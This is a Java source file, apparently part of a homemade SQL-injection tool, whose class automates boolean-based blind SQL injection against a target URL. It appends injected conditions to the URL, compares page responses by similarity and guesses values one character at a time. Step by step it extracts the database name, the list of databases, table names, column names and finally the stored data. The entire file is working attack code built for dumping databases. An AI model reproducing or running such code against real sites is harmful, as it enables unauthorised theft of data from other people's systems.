package com.pagen.examination.InjectTest;

import com.pagen.examination.InjectTest.Driver.BaseDriver;
import com.pagen.examination.InjectTest.Driver.BoolBlindDriver;
import com.pagen.examination.InjectTest.Driver.Boundaries;
import com.pagen.examination.URL_Pages_Translation;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

/**
 * Bool盲注实现类
 */
public class BoolBlindTest {

    private final HashMap<String, BoolBlindDriver> Inject = new HashMap<>();//注入Payload
    private BaseOperation opera;//工具
    private URL_Pages_Translation page;//目标页面
    private Boundaries boundaries;//边框

    /**
     * 初始化
     */
    public BoolBlindTest(URL_Pages_Translation page, Boundaries boundaries) {
        try {
            UploadPayload();
            opera = new BaseOperation();
            this.page = page;
            this.boundaries = boundaries;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 运行测试用例，检测 SQL 注入中 URL 的边界信息，判断是什么类型的注入
     *
     * @return 边界
     */
    public BoolBlindDriver runTestPayload() throws MalformedURLException {
        String originUrl = page.getUrl().toString();
        String originPage = this.page.getPageInfo();

        String T2 = new URL_Pages_Translation(originUrl + boundaries.getPrefix() + "and%20length(database())%20>%200" + boundaries.getSuffix()).getPageInfo();

        if (opera.Leven(originPage, T2) != 1) {
            return new BoolBlindDriver();
        }
        return null;
    }

    /**
     * 获取数据库名长度
     *
     * @return 数据库名长度
     */
    public int getDatabaseLen() throws MalformedURLException {
        int smallNum = 0;
        int bigNum = 100;

        BoolBlindDriver guessLen = null;

        String originUrl = this.page.getUrl().toString();
        String originPage = this.page.getPageInfo();

        StringBuilder testUrl = new StringBuilder();
        StringBuilder testTUrl = new StringBuilder();

        for (String b : Inject.keySet()) {
            if (b.equals("Bool Blind Checkout Database length")) {
                guessLen = Inject.get(b);
            }
        }

        //模板url
        testUrl.append(originUrl).append(boundaries.getPrefix()).append(guessLen.getPayload()).append(boundaries.getSuffix());
        testTUrl.append(originUrl).append(boundaries.getPrefix()).append(guessLen.getCheckway()).append(boundaries.getSuffix());

        //修改模板中的值进行判断
        while (true) {
            String outUrl = testUrl.toString().replace("[SMALL_NUM]", String.valueOf(smallNum));
            String outTUrl = testTUrl.toString().replace("[BIG_NUM]", String.valueOf(bigNum));

            String testPage = new URL_Pages_Translation(outUrl).getPageInfo();
            String testTPage = new URL_Pages_Translation(outTUrl).getPageInfo();

            if (opera.Leven(originPage, testPage) < 0.97) {
                if (opera.Leven(originPage, testTPage) >= 0.97) {
                    if (bigNum - smallNum == 1) {
                        return bigNum;
                    }
                    bigNum = (smallNum + bigNum) / 2;
                } else {
                    if (bigNum - smallNum == 1) {
                        return bigNum + 1;
                    }
                    //修改大小
                    int smallBuff = bigNum;
                    bigNum = bigNum * 2 - smallNum;
                    smallNum = smallBuff;
                }
            } else {
                //修改大小
                int bigBuff = smallNum;
                smallNum = smallNum * 2 - bigNum;
                bigNum = bigBuff;
            }
        }
    }

    /**
     * 获取当前数据库名
     */
    public String getNowDatabaseName(int databaseLen) throws MalformedURLException {
        //原始URL信息
        String originUrl = this.page.getUrl().toString();
        String originPage = this.page.getPageInfo();
        URL_Pages_Translation page = this.page;
        //测试用的URL
        StringBuilder testUrl = new StringBuilder();

        StringBuilder DatabaseName = new StringBuilder();
        //设置可能值
        String str = "abcdefghijklmnopqrstuvwxyz";

        //加载驱动
        BoolBlindDriver guessName = new BoolBlindDriver();
        for (String b : Inject.keySet()) {
            if (b.equals("Bool Blind Checkout Now Database_Name")) {
                guessName = Inject.get(b);
            }
        }
        //模板url
        testUrl.append(originUrl).append(boundaries.getPrefix()).append(guessName.getPayload()).append(boundaries.getSuffix());
        String outUrlB = testUrl.toString().replace(" ", "%20");

        for (int i = 0; i < databaseLen; i++) {
            String outUrlB1 = outUrlB.replace("[NUM]", String.valueOf(i + 1));
            for (char CHAR : str.toCharArray()) {
                String outUrl = outUrlB1.replace("[CHAR]", "%27" + DatabaseName + CHAR + "%27");

                System.out.println(outUrl);
                page.setPageInfo(new URL(outUrl));
                String testPage = page.getPageInfo();
                if (opera.Leven(originPage, testPage) < 1) {
                    DatabaseName.append(CHAR);
                    break;
                }
            }
        }

        return DatabaseName.toString();
    }

    /**
     * 获取数据库名
     */
    public List<String> getDatabaseName() throws MalformedURLException {
        boolean EndFlag = true;//结束标志
        List<String> databaseNames;
        //原始URL信息
        String originUrl = this.page.getUrl().toString();
        String originPage = this.page.getPageInfo();
        URL_Pages_Translation page = this.page;
        //测试用的URL
        StringBuilder testUrl = new StringBuilder();

        StringBuilder databasesName = new StringBuilder();
        //设置可能值
        String str = "abcdefghijklmnopqrstuvwxyz,-_@!1234567890/";

        //加载驱动
        BoolBlindDriver guessName = new BoolBlindDriver();
        for (String b : Inject.keySet()) {
            if (b.equals("Bool Blind Checkout Database_Name")) {
                guessName = Inject.get(b);
            }
        }
        //模板url
        testUrl.append(originUrl).append(boundaries.getPrefix()).append(guessName.getPayload()).append(boundaries.getSuffix());
        String outUrlB = testUrl.toString().replace(" ", "%20");//替换空格

        //逐个猜
        for (int i = 0; EndFlag; i++) {
            String outUrlB1 = outUrlB.replace("(NUM)", String.valueOf(i + 1));
            for (char CHAR : str.toCharArray()) {
                String outUrl = outUrlB1.replace("(CHAR)", "%27" + databasesName + CHAR + "%27");

                System.out.println(outUrl);
                page.setPageInfo(new URL(outUrl));
                String testPage = page.getPageInfo();

                if (opera.Leven(originPage, testPage) < 1) {
                    databasesName.append(CHAR);
                    break;
                }
                if (CHAR == '/') {
                    EndFlag = false;
                }
            }
        }
        databaseNames = Arrays.asList(databasesName.toString().split(","));
        return databaseNames;
    }

    /**
     * 获取表名
     */
    public List<String> getTableNames(String Database) throws MalformedURLException {
        boolean EndFlag = true;//结束标志
        List<String> TableNames;
        //原始URL信息
        String originUrl = this.page.getUrl().toString();
        String originPage = this.page.getPageInfo();
        URL_Pages_Translation page = this.page;
        //测试用的URL
        StringBuilder testUrl = new StringBuilder();

        StringBuilder TablesName = new StringBuilder();
        //设置可能值
        String str = "abcdefghijklmnopqrstuvwxyz,-_@!1234567890/";

        //加载驱动
        BoolBlindDriver guessName = new BoolBlindDriver();
        for (String b : Inject.keySet()) {
            if (b.equals("Bool Blind Checkout Table_name")) {
                guessName = Inject.get(b);
            }
        }
        //模板url
        testUrl.append(originUrl).append(boundaries.getPrefix()).append(guessName.getPayload()).append(boundaries.getSuffix());
        String outUrlB2 = testUrl.toString().replace(" ", "%20");//替换空格

        //设置数据库
        String outUrlB = outUrlB2.replace("(DATABASE)", ("%27" + Database + "%27"));

        //逐个猜
        for (int i = 0; EndFlag; i++) {
            String outUrlB1 = outUrlB.replace("(NUM)", String.valueOf(i + 1));
            for (char CHAR : str.toCharArray()) {
                String outUrl = outUrlB1.replace("(CHAR)", "%27" + TablesName + CHAR + "%27");

                System.out.println(outUrl);
                page.setPageInfo(new URL(outUrl));
                String testPage = page.getPageInfo();

                if (opera.Leven(originPage, testPage) < 1) {
                    TablesName.append(CHAR);
                    break;
                }
                if (CHAR == '/') {
                    EndFlag = false;
                }
            }
        }
        TableNames = Arrays.asList(TablesName.toString().split(","));
        return TableNames;
    }

    /**
     * 获取列名
     */
    public List<String> getColumnNames(String Database, String Table) throws MalformedURLException {
        boolean EndFlag = true;//结束标志
        List<String> ColumnNames;
        //原始URL信息
        String originUrl = this.page.getUrl().toString();
        String originPage = this.page.getPageInfo();
        URL_Pages_Translation page = this.page;
        //测试用的URL
        StringBuilder testUrl = new StringBuilder();

        StringBuilder TablesName = new StringBuilder();
        //设置可能值
        String str = "abcdefghijklmnopqrstuvwxyz,-_@!1234567890/";

        //加载驱动
        BoolBlindDriver guessName = new BoolBlindDriver();
        for (String b : Inject.keySet()) {
            if (b.equals("Bool Blind Checkout Column_name")) {
                guessName = Inject.get(b);
            }
        }
        //模板url
        testUrl.append(originUrl).append(boundaries.getPrefix()).append(guessName.getPayload()).append(boundaries.getSuffix());
        String outUrlB2 = testUrl.toString().replace(" ", "%20");

        //设置数据库
        String outUrlB3 = outUrlB2.replace("(DATABASE)", ("%27" + Database + "%27"));
        String outUrlB = outUrlB3.replace("(TABLE)", ("%27" + Table + "%27"));

        for (int i = 0; EndFlag; i++) {
            String outUrlB1 = outUrlB.replace("(NUM)", String.valueOf(i + 1));
            for (char CHAR : str.toCharArray()) {
                String outUrl = outUrlB1.replace("(CHAR)", "%27" + TablesName + CHAR + "%27");

                System.out.println(outUrl);
                page.setPageInfo(new URL(outUrl));
                String testPage = page.getPageInfo();
                if (opera.Leven(originPage, testPage) < 1) {
                    TablesName.append(CHAR);
                    break;
                }
                if (CHAR == '/') {
                    EndFlag = false;
                }
            }
        }

        ColumnNames = Arrays.asList(TablesName.toString().split(","));

        return ColumnNames;
    }

    /**
     * 获取数据库名
     */
    public List<String> getDatas(String Database, String Table, String Column) throws MalformedURLException {
        boolean EndFlag = true;//结束标志
        List<String> Datas;

        //原始URL信息
        String originUrl = this.page.getUrl().toString();
        String originPage = this.page.getPageInfo();
        URL_Pages_Translation page = this.page;
        //测试用的URL
        StringBuilder testUrl = new StringBuilder();

        StringBuilder TablesName = new StringBuilder();
        //设置可能值
        String str = "abcdefghijklmnopqrstuvwxyz,-_@!1234567890/";

        //加载驱动
        BoolBlindDriver guessName = new BoolBlindDriver();
        for (String b : Inject.keySet()) {
            if (b.equals("Bool Blind Checkout Data")) {
                guessName = Inject.get(b);
            }
        }
        //模板url
        testUrl.append(originUrl).append(boundaries.getPrefix()).append(guessName.getPayload()).append(boundaries.getSuffix());
        String outUrlB2 = testUrl.toString().replace(" ", "%20");

        //设置数据库
        String outUrlB3 = outUrlB2.replace("(COLUMN)", (Column));
        String outUrlB4 = outUrlB3.replace("(DATABASE)", (Database));
        String outUrlB = outUrlB4.replace("(TABLE)", (Table));

        for (int i = 0; EndFlag; i++) {
            String outUrlB1 = outUrlB.replace("(NUM)", String.valueOf(i + 1));
            for (char CHAR : str.toCharArray()) {
                String outUrl = outUrlB1.replace("(CHAR)", "%27" + TablesName + CHAR + "%27");

                System.out.println(outUrl);
                page.setPageInfo(new URL(outUrl));
                String testPage = page.getPageInfo();
                if (opera.Leven(originPage, testPage) < 1) {
                    TablesName.append(CHAR);
                    break;
                }
                if (CHAR == '/') {
                    EndFlag = false;
                }
            }
        }

        Datas = Arrays.asList(TablesName.toString().split(","));
        return Datas;
    }

    public HashMap<String, BoolBlindDriver> getInject() {
        return Inject;
    }

    /**
     * 加载payload
     */
    private void UploadPayload() throws ParserConfigurationException, SAXException, IOException {
        //1、获取解析工厂   SAXParserFactory是protect类型，所以用他的静态方法
        SAXParserFactory factory = SAXParserFactory.newInstance();
        //2、从解析工厂获取解析器
        SAXParser parse = factory.newSAXParser();
        //3、加载文档 Document 注册处理器
        //4、编写处理器
        readDriver handler = new readDriver();
        handler.setClassName("BoolBlindDriver");
        parse.parse("src/xinan/sql/InjectTest/xml/bool_blind.xml", handler);

        List<BaseDriver> base = handler.getPayloads();     //得到一个List对象，里面包含两个Persond类型的对象<person1,person2>

        for (BaseDriver b : base) {
            BoolBlindDriver ub = (BoolBlindDriver) b;
            Inject.put(ub.getTitle(), ub);
        }
    }
}
